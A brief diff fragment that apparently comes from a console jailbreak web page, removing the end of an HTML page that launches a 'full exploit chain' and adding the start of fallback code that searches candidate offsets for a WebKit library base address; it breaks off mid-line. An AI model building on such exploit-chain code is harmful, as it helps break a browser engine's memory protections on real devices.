-            msg.textContent = "Exploit modules failed to load. Check console.";
-            log("Exploit modules failed to load", "log-err");
-            return;
-        }
-    }
-
-    jailbreak.classList.add("disabled", "running");
-    await runFullExploitChain();
-});
-
-</script>
-</body>
-</html>
+    if (!libSceNKWebKitBase) {
+        // Fallback: try each candidate and sanity-check the resulting import.
+        if (typeof ctor === "number") {
+            for (const hc of offsets.wk_host
